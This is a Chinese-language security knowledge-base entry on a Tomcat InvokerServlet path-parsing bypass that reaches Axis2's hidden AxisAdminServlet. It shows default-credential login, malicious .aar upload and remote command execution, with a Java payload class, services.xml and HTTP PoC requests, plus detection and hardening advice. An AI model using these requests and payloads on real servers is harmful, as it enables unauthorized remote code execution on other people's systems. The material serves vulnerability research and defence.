---
id: web-java-component-tomcat-invoker-servlet-axisadmin-aar-upload-rce
title: InvokerServlet 直调 AxisAdminServlet：首斜杠/尾斜杠解析差异让未映射 Axis2 控制台完成登录与 aar 部署 RCE
type: scenario
domain: web
path: web/java/component/tomcat
technique: invoker-servlet-axisadmin-first-last-slash-aar-rce
aliases:
- InvokerServlet Axis2
- AxisAdminServlet 未映射
- /servlet/org.apache.axis2.webapp.AxisAdminServlet
- Axis2 默认口令 admin/axis2
- aar 上传 RCE
- 首斜杠尾斜杠解析差异
tags:
- java
- tomcat
- invoker-servlet
- axis2
- web-service
- aar
- upload
- rce
- default-password
cve: []
severity: critical
confidence: high
affected_versions: Apache Tomcat <= 6.x（InvokerServlet 前提；Axis2 1.6.3 环境验证）
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-V353
  verified_at: '2026-11-09T00:51:57+08:00'
  notes: 已对照原文核对；InvokerServlet 第一个/与 AbstractAgent 最后一个/解析差异、admin/axis2 登录、filename 字段上传 aar、/services/Calc 触发均有截图；Axis2 1.6.3 标为环境验证而非影响区间；未本机复现
---

## 一句话结论

当 Axis2 控制台被人为限制为“不映射出去/仅本地访问”时，只要 Tomcat 6 及更早版本启用了 InvokerServlet 且应用依赖 axis2-webapp，就可以直接请求 `/<ctx>/servlet/org.apache.axis2.webapp.AxisAdminServlet/login` 和 `/upload`：InvokerServlet 取 URL 中**第一个** `/` 后的类名来选中 AxisAdminServlet，而 Axis2 的 `AbstractAgent` 取**最后一个** `/` 后的字符串来调用 `processLogin`/`processUpload`，两段解析互不干扰。用默认口令 `admin/axis2` 登录后上传恶意 aar 部署服务，再访问 `/services/<服务名>` 即触发命令执行。

## 原理

- **InvokerServlet 的路由规则**：`/servlet/` 后去掉前导 `/`，以**第一个** `/` 为界：前面是全限定类名（`org.apache.axis2.webapp.AxisAdminServlet`），后面的剩余路径作为 `pathInfo` 原样传给该 Servlet。因此 `.../AxisAdminServlet/login` 与 `.../AxisAdminServlet/upload` 都能被路由到同一个 AxisAdminServlet，且 `/login`、`/upload` 不影响类名解析。
- **AxisAdminServlet 的分发规则**：`org.apache.axis2.webapp.AxisAdminServlet` 继承 AxisServlet，`doGet/doPost` 把请求交给 `AdminAgent`（`AbstractAgent` 子类）的 `handle`；`AbstractAgent.handle` 取 `requestURI.lastIndexOf('/')`，把**最后一个** `/` 之后的字符串当作操作名，查 `operationCache`（小写匹配）后反射调用 `processIndex`、`processLogin`、`processUpload` 等方法。所以 `/AxisAdminServlet/login` 实际执行 `processLogin`，`/upload` 执行 `processUpload`。
- **两套规则为何能叠加**：InvokerServlet 只看到第一个 `/`，Axis2 只看最后一个 `/`；把操作名放在类名之后再加 `/login`、`/upload`，两边各取所需。文章用 HelloServlet 验证过 `.../HelloServlet/upload` 仍返回 HelloServlet 的响应，证明追加路径段不影响 InvokerServlet 路由。
- **为什么控制台“没映射”也能用**：安全人员常把 `/axis2/axis2-admin` 的映射删掉或只允许本地访问，但 `AxisAdminServlet` 类仍随 axis2-webapp 依赖在 classpath 中；InvokerServlet 绕过 servlet-mapping，直接按类名实例化并转发。
- **加上海默认口令即可 RCE**：Axis2 管理后台默认账号密码为 `admin/axis2`；`processLogin` 校验通过后建立会话，`processUpload` 接收 multipart 的 aar 并部署为 WebService。aar 中的服务类方法执行 `Runtime.getRuntime().exec(...)`，访问 `/services/<服务名>` 即触发。
- **与直接暴露控制台的区别**：控制台映射存在时直接 POST `/axis2/axis2-admin/login` 即可；本卡针对的是映射被移除但 InvokerServlet 仍在的场景，属于“隐藏路径不等于关闭入口”。

## 触发条件

- Tomcat 6.x 或更早，启用 InvokerServlet 并映射 `/servlet/*`。
- 应用 classpath 中存在 axis2-webapp（文章环境为 Axis2 1.6.3），`org.apache.axis2.webapp.AxisAdminServlet` 可加载。
- Axis2 控制台的默认账号密码未被修改（`admin/axis2`；若已修改可尝试爆破）。
- `/services/*` 映射到 AxisServlet（aar 部署后服务可访问），或能通过其他方式访问部署的 WebService。
- 目标没有对 `org.apache.axis2` 类名做类似 `org.apache.catalina` 的额外拦截。

## 利用步骤

1. **确认 InvokerServlet**：请求 `/<ctx>/servlet/<已知Servlet类名>`，确认类名路由生效。
2. **登录**：在已获得合法 JSESSIONID 的情况下 `POST /<ctx>/servlet/org.apache.axis2.webapp.AxisAdminServlet/login`，表单 `userName=admin&password=axis2&submit=+Login+`；响应返回 Axis2 管理页面即登录成功。
3. **准备恶意 aar**：编译一个 WebService 类，方法内执行系统命令；编写 `META-INF/services.xml`，把 `ServiceClass` 指向该类、`exec` 操作的 `messageReceiver` 设为 `RPCMessageReceiver`；按 `com/example/XxxService.class` + `META-INF/` 的目录结构打包 zip 后改名为 `.aar`。
4. **上传部署**：带登录获得的 `JSESSIONID`，`POST /<ctx>/servlet/org.apache.axis2.webapp.AxisAdminServlet/upload`，multipart 字段名 `filename`、文件名 `calc.aar`；响应返回管理页面表示接收成功。
5. **触发**：访问 `/<ctx>/services/<服务名>`（或按服务定义的操作 URL）执行命令，观察回显/弹计算器。

恶意服务类与配置最小示意：

```java
package com.example;
public class CalcService {
    public String exec() throws Exception {
        Runtime.getRuntime().exec("calc");
        return "calc success!";
    }
}
```

```xml
<service name="Calc" targetNamespace="http://ws.apache.org/ax2">
  <description>Web Service</description>
  <parameter name="ServiceClass">com.example.CalcService</parameter>
  <operation name="exec">
    <messageReceiver class="org.apache.axis2.rpc.receivers.RPCMessageReceiver"/>
  </operation>
</service>
```

## PoC

```http
POST /<ctx>/servlet/org.apache.axis2.webapp.AxisAdminServlet/login HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

userName=admin&password=axis2&submit=+Login+
```

```http
POST /<ctx>/servlet/org.apache.axis2.webapp.AxisAdminServlet/upload HTTP/1.1
Host: target:8080
Cookie: JSESSIONID=<登录返回的会话>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="filename"; filename="calc.aar"
Content-Type: application/octet-stream

<calc.aar 的 zip 字节>
------X--
```

触发：`GET /<ctx>/services/Calc HTTP/1.1`，响应包含服务方法返回值（如 `calc success!`），同时命令执行。

## 变体与关联

- **直接暴露控制台**：`/axis2/axis2-admin/login` + `/upload` 的标准流程；本卡是其“控制台未映射”场景的绕过。
- **口令变化**：若默认口令被改，可对 `processLogin` 做字典/爆破，或结合其他信息泄露获取口令。
- **同类“尾段路由”Servlet**：任何按 URL 最后一段决定方法名的 Servlet，都可以尝试嵌套在 InvokerServlet 类名之后，把操作名塞进 `pathInfo`。
- **InvokerServlet 类名路由**：本链的前置原语。
- **BshServlet 链**：同一 InvokerServlet 配置下的另一条 RCE 链。

## 检测与防御

- **移除入口**：删除 InvokerServlet 声明与 `/servlet/*` 映射，升级 Tomcat 7+。
- **关闭控制台**：生产环境移除 axis2-webapp 控制台（或至少修改默认口令、限制来源）；删映射不够，必须移除依赖或加 Filter 拦截 `AxisAdminServlet` 类名。
- **检测**：监控 `/servlet/org.apache.axis2.webapp.AxisAdminServlet`、`/servlet/` 后带业务包名并追加 `/login`、`/upload` 的请求；关注返回 Axis2 管理页面的异常路径。
- **加固**：WAF 对 `/servlet/` + 全限定类名模式做规则；应用侧禁止 InvokerServlet；Axis2 控制台仅回环访问并强口令。
